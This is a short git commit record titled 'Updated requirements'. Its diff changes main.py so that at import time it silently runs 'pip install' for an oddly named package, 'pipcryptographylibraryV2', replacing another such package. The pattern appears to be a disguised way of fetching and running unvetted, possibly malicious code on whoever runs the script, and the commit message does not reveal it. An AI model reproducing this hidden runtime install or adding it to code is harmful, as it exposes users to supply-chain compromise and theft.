f0973b360968ff3244c83e58321bbf1c254b83f5
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-21 19:13:00 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pipcryptographylibraryV2")
+import pipcryptographylibraryV2
 import sys
 import time
 import psutil
